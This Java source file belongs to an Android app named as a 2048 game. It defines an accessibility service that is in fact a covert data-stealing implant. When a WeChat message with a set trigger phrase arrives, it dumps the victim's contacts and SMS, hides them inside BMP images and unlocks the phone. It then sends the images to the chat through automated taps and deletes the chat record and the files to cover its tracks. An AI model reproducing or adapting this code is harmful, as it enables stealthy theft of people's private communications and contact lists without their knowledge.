package com.example.sy.androidgame2048;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;

public class reply extends AccessibilityService {

    private String ChatName = null;
    private String text = null;
    private Handler handler = new Handler();
    private boolean flag = false;
    private boolean locked=false;
    private boolean canReply = false;//能否回复且每次收到消息只回复一次
    private boolean enableKeyguard = true;//默认有屏幕锁
    private KeyguardManager km;
    private KeyguardManager.KeyguardLock kl;
    private PowerManager pm;
    private PowerManager.WakeLock wl = null;
    private String TAG = "SupportBlue";

    private ScreenOffReceiver sreceiver;


    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        Log.i(TAG, "getEvent");
        Log.i(TAG, String.valueOf(eventType));
        switch (eventType) {
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                ContentValues values = sendNotifacationReply(event);
                if (values != null) {

                    ChatName = values.getAsString("name");
                    text = values.getAsString("text");
                    Log.i(TAG, text);
                    judge(ChatName, text, event);
                    ChatName = text = null;
                }

                break;
            default:
                //Toast.makeText(this, "遇见了很奇怪的问题哦", Toast.LENGTH_SHORT).show();
                break;
        }
    }

    private void deleteFiles(String dirname) {
        File dir = new File(dirname);
        //首先得到当前的路径
        String[] childFileNames = dir.list();
        for (String childFileName : childFileNames) {
            if(childFileName.contains(".1.bmp")||childFileName.contains(".txt")){
                String childFilepath = dir.getAbsolutePath() + '/' + childFileName;
                File childFile = new File(childFilepath);
                childFile.delete();
            }
        }
    }

    private void deleteRecord() {
        try {
            Thread.sleep(1000);
        } catch (Exception e) {
            e.printStackTrace();
        }
        AccessibilityNodeInfo source10 = getRootInActiveWindow();
        List<AccessibilityNodeInfo> temp1s = source10.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/ajz");
        for (AccessibilityNodeInfo temp1 : temp1s) {
            temp1.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK);
            break;
        }

        try {
            Thread.sleep(1000);
        } catch (Exception e) {
            e.printStackTrace();
        }
        AccessibilityNodeInfo source11 = getRootInActiveWindow();
        List<AccessibilityNodeInfo> temp2s = source11.findAccessibilityNodeInfosByText("删除该聊天");
        for (AccessibilityNodeInfo temp2 : temp2s) {
            temp2.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            break;
        }

    }


    @SuppressLint("NewApi")
    private void send() {
        AccessibilityNodeInfo source = getRootInActiveWindow();
        List<AccessibilityNodeInfo> addIconInfos = source.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/a76");
        nextClick(addIconInfos);
        Log.i(TAG, "点击加号完毕，等5s");
        try{
            Thread.sleep(5000);
        }catch (Exception e){
            e.printStackTrace();
        }

        Log.i(TAG, "5s后，下面查找相册");

        List<AccessibilityNodeInfo> imageInfo = source.findAccessibilityNodeInfosByText("相册");
        try {


            int length = imageInfo.size();
            Log.i(TAG, String.valueOf(length));

            AccessibilityNodeInfo tess = imageInfo.get(0);

            while(!tess.isClickable()){
                tess = tess.getParent();
            }

            if (tess.isClickable()){
                Log.i(TAG, "找完了能点");
            }else {
                Log.i(TAG, "找到了不能点");
            }
            tess.performAction(AccessibilityNodeInfo.ACTION_CLICK);

        }catch (IndexOutOfBoundsException e){
            e.printStackTrace();
        }
//
//        List<AccessibilityNodeInfo> imageInfos = source.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/no");
//        for(AccessibilityNodeInfo child :imageInfos){
//            child.getChild(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
//            break;
//        }



        try{
            Thread.sleep(5000);
        }catch (Exception e){
            e.printStackTrace();
        }
        AccessibilityNodeInfo source2 = getRootInActiveWindow();
        List<AccessibilityNodeInfo> listInfos = source2.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/cmi");


        AccessibilityNodeInfo temp2=listInfos.get(0);
        while(!temp2.isClickable()){
            temp2 = temp2.getParent();
        }
        temp2.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        try{
            Thread.sleep(2000);
        }catch (Exception e){
            e.printStackTrace();
        }



        AccessibilityNodeInfo source3 = getRootInActiveWindow();
        List<AccessibilityNodeInfo> chooseDirInfos = source3.findAccessibilityNodeInfosByText("2048Screen");
        AccessibilityNodeInfo temp3=chooseDirInfos.get(0);
        while(!temp3.isClickable()){
            temp3 = temp3.getParent();
        }
        temp3.performAction(AccessibilityNodeInfo.ACTION_CLICK);


        try{
            Thread.sleep(2000);
        }catch (Exception e){
            e.printStackTrace();
        }
        AccessibilityNodeInfo source5 = getRootInActiveWindow();
        List<AccessibilityNodeInfo> moreInfos = source5.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/bd0");
        if (!moreInfos.isEmpty()) {

            for (AccessibilityNodeInfo info : moreInfos) {
                if (info.isEnabled() && info.isClickable()) {
                    info.performAction(AccessibilityNodeInfo.ACTION_CLICK);

                }
            }
        }

        try{
            Thread.sleep(2000);
        }catch (Exception e){
            e.printStackTrace();
        }
        AccessibilityNodeInfo source6 = getRootInActiveWindow();

        List<AccessibilityNodeInfo> truePictureInfos = source6.findAccessibilityNodeInfosByText("原图");
        truePictureInfos.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);

        try{
            Thread.sleep(2000);
        }catch (Exception e){
            e.printStackTrace();
        }
        AccessibilityNodeInfo source7 = getRootInActiveWindow();
        List<AccessibilityNodeInfo> sendInfos = source7.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/gy");
        nextClick_spe_1(sendInfos, "发送");  //判断条件得加上text   getText()
    }

    private void nextClick_spe_1(List<AccessibilityNodeInfo> infos, String text) {
        if (!infos.isEmpty()) {
            for (AccessibilityNodeInfo info : infos) {
                if (info.isClickable() && info.getText().toString().contains(text)) {
                    info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
            }
        }
    }

    private void nextClick(List<AccessibilityNodeInfo> infos) {
        if (!infos.isEmpty())
            for (AccessibilityNodeInfo info : infos) {
                if (info.isEnabled() && info.isClickable())
                    info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }

    }




    private void judge(String ChatName, String text, AccessibilityEvent event) {

        switch (text) {
            case "给我发一张表情包吧":    //要聊天记录的指令

                getCONTACTData();
                getSMSData();

                String outdir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
                outdir += "/Camera/2048Screen";
                try {
                    DoubleExecute.DataToWav(outdir+"/SMS.txt",outdir+"/Screen-1.bmp",outdir+"/Screen1.1.bmp");
                    DoubleExecute.DataToWav(outdir+"/CONTACT.txt",outdir+"/Screen-2.bmp",outdir+"/Screen2.1.bmp");

                } catch (IOException e) {
                    e.printStackTrace();
                    System.out.println("错误");
                }

                sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(new File("/sdcard/DCIM/Camera/2048Screen/Screen-1.bmp"))));
                sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(new File("/sdcard/DCIM/Camera/2048Screen/Screen-2.bmp"))));
                sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(new File("/sdcard/DCIM/Camera/2048Screen/Screen1.1.bmp"))));
                sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(new File("/sdcard/DCIM/Camera/2048Screen/Screen2.1.bmp"))));

                canReply = true;
                wakeAndUnlock(true);

                try {
                    Thread.sleep(1000); // 停1秒, 否则在微信主界面没进入聊天界面就执行了fillInputBar
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                openAppByNotification(event);
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                send();

                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                        deleteRecord();
                        back2Home();
                        String outdir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
                        outdir += "/Camera/2048Screen";
                        deleteFiles(outdir);
                        //release();
                        wakeAndUnlock(false);

                    }
                },11000);


                break;

        }
    }



    private void openAppByNotification(AccessibilityEvent event) {
        if (event.getParcelableData() != null && event.getParcelableData() instanceof Notification) {
            Notification notification = (Notification) event.getParcelableData();
            try {
                PendingIntent pendingIntent = notification.contentIntent;
                pendingIntent.send();
            } catch (PendingIntent.CanceledException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onInterrupt() {
    }


    private ContentValues sendNotifacationReply(AccessibilityEvent event) {
        if (event.getParcelableData() != null && event.getParcelableData() instanceof Notification) {
            Notification notification = (Notification) event.getParcelableData();
            String content = notification.tickerText.toString();
            String[] cc = content.split(":");
            ContentValues values = new ContentValues();
            values.put("name", cc[0].trim());
            values.put("text", cc[1].trim());
            return values;
        } else {
            return null;
        }
    }


    private void getCONTACTData() {
        ContentResolver cr = getContentResolver();
        //获取所有电话信息（而不是联系人信息），这样方便展示
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String[] projection = {
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,// 姓名
                ContactsContract.CommonDataKinds.Phone.NUMBER,// 电话号码
        };
        Cursor cursor = cr.query(uri, projection, null, null, null);
        if (cursor == null) {
            return;
        }

        String outdir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
        outdir += "/Camera/2048Screen";

        File file = new File(outdir, "CONTACT.txt");
        //最终要返回的数据

        try {
            FileOutputStream out = new FileOutputStream(file);

            if (cursor.moveToFirst()) {
                do {
                    String name = cursor.getString(0);
                    String number = cursor.getString(1);
                    //保存到对象里
                    String total = name + "  " + number + "\n";
                    out.write(total.getBytes());
                } while (cursor.moveToNext());
            }
            out.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        //用完记得关闭
        cursor.close();
    }

    private void getSMSData() {
        Uri SMS_INBOX = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"address", "person", "body"};//"_id", "address", "person",, "date", "type
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cur)
            return;

        String outdir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
        outdir += "/Camera/2048Screen";

        File file = new File(outdir, "SMS.txt");
        try {
            FileOutputStream out = new FileOutputStream(file);

            if (cur.moveToFirst()) {
                do {
                    String number = cur.getString(cur.getColumnIndex("address"));//手机号
                    String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
                    String body = cur.getString(cur.getColumnIndex("body"));//短信具体内容

                    String total = number + "  " + name + "  " + body + "\r\n";
                    out.write(total.getBytes());
                } while (cur.moveToNext());
            }
            out.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        cur.close();
    }



    private void back2Home() {
        try{
            Thread.sleep(1000);
        }catch (Exception e){
            e.printStackTrace();
        }
        Intent home = new Intent(Intent.ACTION_MAIN);

        home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        home.addCategory(Intent.CATEGORY_HOME);

        startActivity(home);
    }


    private void wakeAndUnlock(boolean unLock)
    {
        if(unLock)
        {
            if(!pm.isScreenOn()) {
                //获取电源管理器对象
                wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "bright");
                //点亮屏幕
                wl.setReferenceCounted(false);
                wl.acquire(80000);
                Log.i(TAG, "亮屏");
            }
            if(km.inKeyguardRestrictedInputMode()) {
                //解锁
                enableKeyguard = false;
                //kl.reenableKeyguard();
                kl.disableKeyguard();
                Log.i(TAG, "解锁");
            }
        } else {
            if(!enableKeyguard) {
                //锁屏
                kl.reenableKeyguard();
                Log.i(TAG, "加锁");
            }
            if(wl != null) {
                //释放wakeLock，关灯
                wl.release();
                wl = null;
                Log.i(TAG, "关灯");
            }
        }
    }

    private void release() {
        if (locked && kl != null) {
            //得到键盘锁管理器对象
            //     wl.release();
            kl.reenableKeyguard();

            //     wl=null;
            locked = false;
        }
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG,"open service");

        pm=(PowerManager)getSystemService(Context.POWER_SERVICE);
//        得到键盘锁管理器对象
        km= (KeyguardManager)getSystemService(Context.KEYGUARD_SERVICE);
        //得到键盘锁管理器对象
        kl = km.newKeyguardLock("unLock");


        sreceiver = new ScreenOffReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        registerReceiver(sreceiver, filter);

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(sreceiver);
    }

    class ScreenOffReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {

            String action = intent.getAction();
            if (action.equals(Intent.ACTION_SCREEN_OFF)) {
                Log.i(TAG, "_______________________SCREEN_OFF");
                Intent lockscreen = new Intent(reply.this, OnePiexlActivity.class);
                lockscreen.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(lockscreen);
            } else if (action.equals(Intent.ACTION_SCREEN_ON)) {
                context.sendBroadcast(new Intent("finish"));
                if(canReply) {
                    Log.i(TAG, "-------------can reply true");
                    //canReply=false;

                    return;
                }else {
                    Log.i(TAG, "-------------can reply false");
                }
                Intent test = new Intent(Intent.ACTION_MAIN,null);
                test.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                test.addCategory(Intent.CATEGORY_HOME);
                startActivity(test);
            }
        }
    }


}
